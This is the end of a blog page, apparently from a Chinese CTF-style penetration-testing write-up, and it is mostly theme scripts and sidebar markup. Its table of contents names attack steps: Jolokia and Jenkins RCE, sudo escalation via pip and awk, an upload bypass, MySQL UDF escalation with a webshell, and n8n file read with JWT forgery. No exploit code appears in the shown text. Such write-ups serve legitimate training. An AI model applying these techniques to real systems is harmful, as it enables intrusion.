href="#sudo%E6%8F%90%E6%9D%83-pip"><span class="toc-number">3.2.</span> <span class="toc-text"> SUDO提权-pip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E4%B8%AD%E7%AA%A5%E8%B1%B9"><span class="toc-number">4.</span> <span class="toc-text"> 管中窥豹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jenkins-%E5%90%8E%E5%8F%B0rce"><span class="toc-number">4.1.</span> <span class="toc-text"> Jenkins 后台RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83-awk"><span class="toc-number">4.2.</span> <span class="toc-text"> SUDO提权-awk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%97%E6%B8%A1%E9%99%88%E4%BB%93%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text"> 暗渡陈仓(复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ghost-bits-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text"> Ghost Bits 上传绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE"><span class="toc-number">5.2.</span> <span class="toc-text"> 获取数据库凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83%E5%86%B0%E8%9D%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">5.3.</span> <span class="toc-text"> UDF提权+冰蝎自定义代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0so%E7%BC%96%E8%AF%91%E6%96%87%E4%BB%B6"><span class="toc-number">5.3.1.</span> <span class="toc-text"> 上传so编译文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-jdbc-%E5%86%99%E5%85%A5%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%B9%B6%E5%88%9B%E5%BB%BA-udf"><span class="toc-number">5.3.2.</span> <span class="toc-text"> 通过 JDBC 写入插件目录并创建 UDF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">5.4.</span> <span class="toc-text"> 攻击链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E9%94%81%E5%8F%8D%E5%BA%94%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.</span> <span class="toc-text"> 连锁反应(复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#n8n%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.1.</span> <span class="toc-text"> n8n信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-type-%E6%B7%B7%E6%B7%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">6.2.</span> <span class="toc-text"> Content-Type 混淆任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%AE%A1%E7%90%86%E5%91%98-jwt"><span class="toc-number">6.3.</span> <span class="toc-text"> 伪造管理员 JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%B9%B6%E6%89%A7%E8%A1%8C-code-%E8%8A%82%E7%82%B9"><span class="toc-number">6.4.</span> <span class="toc-text"> 创建并执行 Code 节点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE-2"><span class="toc-number">6.5.</span> <span class="toc-text"> 攻击链</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "破阵阁-渗透实战挑战赛",
+          url: "http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/",
+          excerpt: "",
+          description: "",
+          stripContent: " 404号节点   Jolokia RCE 目录扫描发现/actuator泄露    访问/actuator/jolokia/list找出能利用的MBean  给ai分析得到一个自定义的Bean: 123456789101112&amp;quot;com.example&amp;quot;:&amp;#123;  &amp;quot;type=Diagnostics&amp;quot;:&amp;#123;    &amp;quot;op&amp;quot;:&amp;#123;      &amp;quot;runDiagnostic&amp;quot;:&amp;#123;      ",
+          date: "Sat Jun 13 2026 15:04:52 GMT+0800",
+          updated: "Sun Jun 14 2026 16:55:15 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
